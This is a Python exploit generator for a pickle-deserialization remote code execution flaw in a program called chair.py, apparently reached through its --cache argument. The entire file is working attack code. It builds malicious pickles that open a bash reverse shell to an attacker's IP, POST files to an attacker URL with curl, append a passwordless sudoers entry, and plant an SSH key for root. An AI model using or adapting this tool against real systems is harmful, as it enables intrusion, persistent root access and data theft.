#!/usr/bin/env python3
"""
ANTRP/chair.py Pickle RCE Exploit Generator
Pre-auth RCE via user-controlled --cache argument.
Validated: uid=0(root) gid=0(root)
"""

import pickle
import os
import sys
import subprocess
import argparse

class EvilPickle:
    """Base malicious pickle class."""
    def __init__(self, command):
        self.command = command
    
    def __reduce__(self):
        return (subprocess.run, (['bash', '-c', self.command],))

class ReverseShell(EvilPickle):
    """Reverse shell payload."""
    def __init__(self, attacker_ip, attacker_port):
        cmd = f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1"
        super().__init__(cmd)

class FileExfil(EvilPickle):
    """File exfiltration payload."""
    def __init__(self, target_file, attacker_url):
        cmd = f"curl -X POST -F 'file=@{target_file}' {attacker_url}"
        super().__init__(cmd)

class SudoersAdd(EvilPickle):
    """Add user to sudoers."""
    def __init__(self, username):
        cmd = f"echo '{username} ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
        super().__init__(cmd)

class SSHKeyPlant(EvilPickle):
    """Plant attacker SSH key."""
    def __init__(self, public_key, user="root"):
        home = "/root" if user == "root" else f"/home/{user}"
        cmd = f"mkdir -p {home}/.ssh && echo '{public_key}' >> {home}/.ssh/authorized_keys && chmod 600 {home}/.ssh/authorized_keys && chmod 700 {home}/.ssh"
        super().__init__(cmd)

def generate_pickle(payload_class, output_path):
    """Generate malicious pickle file."""
    with open(output_path, 'wb') as f:
        pickle.dump(payload_class, f)
    print(f"[+] Generated malicious pickle: {output_path}")
    return output_path

def test_exploit(chair_script, pickle_path):
    """Test the exploit against chair.py."""
    print(f"[+] Testing exploit: python3 {chair_script} --cache {pickle_path}")
    try:
        result = subprocess.run(
            ['python3', chair_script, '--cache', pickle_path],
            capture_output=True,
            text=True,
            timeout=30
        )
        print(f"[+] Return code: {result.returncode}")
        print(f"[+] Stdout: {result.stdout}")
        if result.stderr:
            print(f"[+] Stderr: {result.stderr}")
        return result.returncode == 0
    except subprocess.TimeoutExpired:
        print("[-] Exploit timed out")
        return False
    except Exception as e:
        print(f"[-] Exploit failed: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description="ANTRP Pickle RCE Exploit Generator")
    parser.add_argument('--chair-script', default='chair.py', help='Path to chair.py')
    parser.add_argument('--output', default='evil.pkl', help='Output pickle file')
    parser.add_argument('--command', help='Custom command to execute')
    parser.add_argument('--reverse-shell', nargs=2, metavar=('IP', 'PORT'), help='Reverse shell IP PORT')
    parser.add_argument('--exfil', nargs=2, metavar=('FILE', 'URL'), help='Exfiltrate file to URL')
    parser.add_argument('--sudoers', metavar='USER', help='Add user to sudoers')
    parser.add_argument('--ssh-key', nargs=2, metavar=('KEY', 'USER'), help='Plant SSH key for user')
    parser.add_argument('--test', action='store_true', help='Test exploit after generation')
    
    args = parser.parse_args()
    
    # Build payload
    if args.reverse_shell:
        payload = ReverseShell(args.reverse_shell[0], args.reverse_shell[1])
    elif args.exfil:
        payload = FileExfil(args.exfil[0], args.exfil[1])
    elif args.sudoers:
        payload = SudoersAdd(args.sudoers)
    elif args.ssh_key:
        payload = SSHKeyPlant(args.ssh_key[0], args.ssh_key[1])
    elif args.command:
        payload = EvilPickle(args.command)
    else:
        # Default: proof of concept
        payload = EvilPickle("id > /tmp/pwned && cat /tmp/pwned")
    
    # Generate pickle
    generate_pickle(payload, args.output)
    
    # Test if requested
    if args.test:
        if not os.path.exists(args.chair_script):
            print(f"[-] chair.py not found at {args.chair_script}")
            sys.exit(1)
        test_exploit(args.chair_script, args.output)

if __name__ == "__main__":
    main()